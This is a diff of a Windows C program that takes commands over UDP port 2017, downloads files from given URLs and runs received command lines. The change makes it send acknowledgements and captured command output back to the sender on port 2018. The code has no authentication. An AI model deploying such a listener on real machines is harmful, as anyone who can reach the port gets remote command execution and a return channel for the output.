@@ -7,24 +7,23 @@
 
 #define BUFFER_LEN 512
 
-INT InitNetwork()
+BOOL InitNetwork(SNOWDATA *data)
 {
 	WORD wsVersion = MAKEWORD(2, 2);
 	WSADATA wsaData;
 	INT iResult;
-	INT Sock;
 
 	iResult = WSAStartup(wsVersion, &wsaData);
 	if (iResult != 0)
 	{
-		return INVALID_SOCKET;
+		return FALSE;
 	}
 
-	Sock = socket(AF_INET, SOCK_DGRAM, 0);
-	if (Sock == INVALID_SOCKET)
+	data->Sock = socket(AF_INET, SOCK_DGRAM, 0);
+	if (data->Sock == INVALID_SOCKET)
 	{
 		WSACleanup();
-		return INVALID_SOCKET;
+		return FALSE;
 	}
 
 	//int error = WSAGetLastError();
@@ -36,18 +35,26 @@ INT InitNetwork()
 	BindAddress.sin_port = htons(2017);
 
 	const int reuse = 1;
-	setsockopt(Sock, SOL_SOCKET, SO_REUSEADDR, (const char*)&reuse, sizeof(reuse));
+	setsockopt(data->Sock, SOL_SOCKET, SO_REUSEADDR, (const char*)&reuse, sizeof(reuse));
 
-	iResult = bind(Sock, (const sockaddr*)&BindAddress, sizeof(BindAddress));
+	iResult = bind(data->Sock, (const sockaddr*)&BindAddress, sizeof(BindAddress));
 	if (iResult != 0)
 	{
 		//int error2 = WSAGetLastError();
-		closesocket(Sock);
+		closesocket(data->Sock);
 		WSACleanup();
-		return INVALID_SOCKET;
+		return FALSE;
 	}
 
-	return Sock;
+	data->msgSock = socket(AF_INET, SOCK_DGRAM, 0);
+	if (data->msgSock == INVALID_SOCKET)
+	{
+		closesocket(data->Sock);
+		WSACleanup();
+		return FALSE;
+	}
+
+	return TRUE;
 }
 
 DWORD WINAPI NetThreadProc(LPVOID lParam)
@@ -57,7 +64,7 @@ DWORD WINAPI NetThreadProc(LPVOID lParam)
 		MessageBox(NULL, TEXT("Thread Error"), TEXT("Error"), MB_OK | MB_ICONERROR);
 		return 0;
 	}
-	THREAD_DATA dataPassed = *((THREAD_DATA *)lParam);
+	SNOWDATA dataPassed = *((SNOWDATA *)lParam);
 	TCHAR szBuffer[BUFFER_LEN + 1];
 	INT iResult, iLength = sizeof(SOCKADDR_IN);
 	SOCKADDR_IN IncomingAddr;
@@ -71,13 +78,17 @@ DWORD WINAPI NetThreadProc(LPVOID lParam)
 			(sockaddr*)&IncomingAddr, &iLength);
 
 		//int error = WSAGetLastError();
-		ParseData(dataPassed.hOutput, szBuffer, iResult, IncomingAddr.sin_addr);
+		iResult = ParseData(dataPassed.msgSock, dataPassed.hOutput, szBuffer, iResult, IncomingAddr.sin_addr);
+		if (iResult == FALSE)
+		{
+			break;
+		}
 	}
 
 	return 0;
 }
 
-VOID ParseData(HWND hOutput, TCHAR szDataRecv[], UINT RecvSize, IN_ADDR fromAddress)
+BOOL ParseData(INT msgSock, HWND hOutput, TCHAR szDataRecv[], UINT RecvSize, IN_ADDR fromAddress)
 {
 	TCHAR *szDisplayBuffer = (TCHAR *)LocalAlloc(LMEM_ZEROINIT, BUFFER_LEN * 200);
 	TCHAR *szDisplayBufferB = (TCHAR *)LocalAlloc(LMEM_ZEROINIT, BUFFER_LEN * 200);
@@ -91,7 +102,7 @@ VOID ParseData(HWND hOutput, TCHAR szDataRecv[], UINT RecvSize, IN_ADDR fromAddr
 
 		LocalFree(szDisplayBuffer);
 		LocalFree(szDisplayBufferB);
-		return;
+		return FALSE;
 	}
 	
 	TCHAR szType[6] = { 0 }, szBuffer[BUFFER_LEN] = { 0 }, *p = szDataRecv;
@@ -111,6 +122,8 @@ VOID ParseData(HWND hOutput, TCHAR szDataRecv[], UINT RecvSize, IN_ADDR fromAddr
 		free(UnicodeIpAddr);
 
 		SetWindowText(hOutput, szDisplayBufferB);
+		const LPWSTR msg = L"Message Received\r\n";
+		SendMessageToServer(msgSock, fromAddress, msg, lstrlenW(msg) * sizeof(WCHAR));
 	}
 	else if (lstrcmp(szType, TEXT("#Dow#")) == 0)
 	{
@@ -124,12 +137,17 @@ VOID ParseData(HWND hOutput, TCHAR szDataRecv[], UINT RecvSize, IN_ADDR fromAddr
 		if (DownloadFile(szBuffer, szSavedPath) == TRUE)
 		{
 			wsprintf(szDisplayBuffer,
-				TEXT("%sDownload Finish!\r\nSaved to: %s\r\n"),
-				szDisplayBufferB, szSavedPath);
+				TEXT("Download Finish!\r\nSaved to: %s\r\n"), szSavedPath);
+			SendMessageToServer(msgSock, fromAddress, szDisplayBuffer, 
+				lstrlen(szDisplayBuffer) * sizeof(TCHAR));
+
+			lstrcat(szDisplayBufferB, szDisplayBuffer);
 		}
 		else
 		{
-			wsprintf(szDisplayBuffer, TEXT("%sDownload Fail!\r\n"), szDisplayBufferB);
+			const LPWSTR msg = L"Download Fail!\r\n";
+			wsprintf(szDisplayBuffer, TEXT("%s%s\r\n"), szDisplayBufferB, msg);
+			SendMessageToServer(msgSock, fromAddress, msg, lstrlenW(msg) * sizeof(WCHAR));
 		}
 		SetWindowText(hOutput, szDisplayBuffer);
 	}
@@ -141,47 +159,62 @@ VOID ParseData(HWND hOutput, TCHAR szDataRecv[], UINT RecvSize, IN_ADDR fromAddr
 		free(UnicodeIpAddr);
 		SetWindowText(hOutput, szDisplayBufferB);
 
-		if (ExecuteCommand(hOutput, szBuffer) == TRUE)
+		if (ExecuteCommand(msgSock, fromAddress, hOutput, szBuffer) == TRUE)
 		{
+			const LPWSTR msg = L"Execute Success!\r\n";
 			GetWindowText(hOutput, szDisplayBufferB, BUFFER_LEN * 100);
 			wsprintf(szDisplayBuffer,
-				TEXT("%sExecute Success!\r\n"), szDisplayBufferB);
+				TEXT("%s%s\r\n"), szDisplayBufferB, msg);
+
+			SendMessageToServer(msgSock, fromAddress, msg, lstrlenW(msg) * sizeof(WCHAR));
 		}
 		else
 		{
+			const LPWSTR msg = L"Execute Fail!\r\n";
 			GetWindowText(hOutput, szDisplayBufferB, BUFFER_LEN * 100);
 			wsprintf(szDisplayBuffer,
-				TEXT("%sExecute Fail!\r\n"), szDisplayBufferB);
+				TEXT("%s%s\r\n"), szDisplayBufferB, msg);
+			SendMessageToServer(msgSock, fromAddress, msg, lstrlenW(msg) * sizeof(WCHAR));
 		}
 		SetWindowText(hOutput, szDisplayBuffer);
 	}
 	else
 	{
+		const LPWSTR msg = L"Unknown Data\r\n";
 		LPTSTR UnicodeIpAddr = ANSIToUnicode(inet_ntoa(fromAddress));
-		wsprintf(szDisplayBufferB, TEXT("%s[%s]\r\nUnknown Data\r\n"), szDisplayBuffer,
-			UnicodeIpAddr);
+		wsprintf(szDisplayBufferB, TEXT("%s[%s]%s\r\n\r\n"), szDisplayBuffer,
+			UnicodeIpAddr, msg);
 		free(UnicodeIpAddr);
 
+		SendMessageToServer(msgSock, fromAddress, msg, lstrlenW(msg) * sizeof(WCHAR));
 		SetWindowText(hOutput, szDisplayBufferB);
 	}
 	LocalFree(szDisplayBuffer);
 	LocalFree(szDisplayBufferB);
+
+	return TRUE;
 }
 
-VOID CleanNetwork(INT Sock)
+VOID CleanNetwork(INT Sock, INT msgSock)
 {
-	int error = WSAGetLastError();
+	//int error = WSAGetLastError();
 
-	if (Sock != INVALID_SOCKET || Sock != 0)
+	if (Sock != INVALID_SOCKET && Sock != 0)
 	{
 		shutdown(Sock, SD_BOTH);
 		closesocket(Sock);
 	}
 
+	if (msgSock != INVALID_SOCKET && msgSock != 0)
+	{
+		shutdown(msgSock, SD_BOTH);
+		closesocket(msgSock);
+	}
+
 	WSACleanup();
 }
 
-BOOL ExecuteCommand(HWND hOutput, const LPTSTR lpCmdLine)
+BOOL ExecuteCommand(INT msgSock, IN_ADDR ServerAddr, HWND hOutput, const LPTSTR lpCmdLine)
 {
 	HANDLE hStdinRead, hStdinWrite,
 		hStdoutRead, hStdoutWrite;
@@ -248,10 +281,15 @@ BOOL ExecuteCommand(HWND hOutput, const LPTSTR lpCmdLine)
 	ReadFile(hStdoutRead, szBuffer, BUFFER_LEN * 200, &dActualRead, NULL);
 	GetWindowTextA(hOutput, szDisplayBuffer, BUFFER_LEN * 100);
 	
-	wsprintfA(szDisplayBufferB, "%s-------------%s\r\n-------------\r\n",
-		szDisplayBuffer, szBuffer);
+	wsprintfA(szDisplayBufferB, "-------------%s\r\n-------------\r\n", szBuffer);
 
-	SetWindowTextA(hOutput, szDisplayBufferB);
+	LPWSTR msgToSend = ANSIToUnicode(szDisplayBufferB);
+	SendMessageToServer(msgSock, ServerAddr, msgToSend,
+		lstrlenW(msgToSend) * sizeof(WCHAR));
+	free(msgToSend);
+
+	lstrcatA(szDisplayBuffer, szDisplayBufferB);
+	SetWindowTextA(hOutput, szDisplayBuffer);
 
 	LocalFree(szBuffer);
 	LocalFree(szDisplayBuffer);
@@ -302,6 +340,30 @@ LPTSTR GetFilenameFromUrl(const LPTSTR szUrl)
 	*q = 0;
 
 	return szFileName;
+}
+
+BOOL SendMessageToServer(INT msgSock, IN_ADDR Address, LPTSTR szData, ULONG iDataSize)
+{
+	if (msgSock == 0 || msgSock == INVALID_SOCKET)
+	{
+		return FALSE;
+	}
+
+	SOCKADDR_IN SockInfo;
+	ZeroMemory(&SockInfo, sizeof(SockInfo));
+	SockInfo.sin_family = AF_INET;
+	SockInfo.sin_port = htons(2018);
+	SockInfo.sin_addr = Address;
+	INT iResult;
+
+	iResult = sendto(msgSock, (const char *)szData, iDataSize,
+		0, (const sockaddr*)&SockInfo, sizeof(SockInfo));
+	if (iResult < (INT)iDataSize)
+	{
+		return FALSE;
+	}
+
+	return TRUE;
 }
 
 // Copy from http://blog.csdn.net/linuxandroidwince/article/details/7527232 2017-04-11
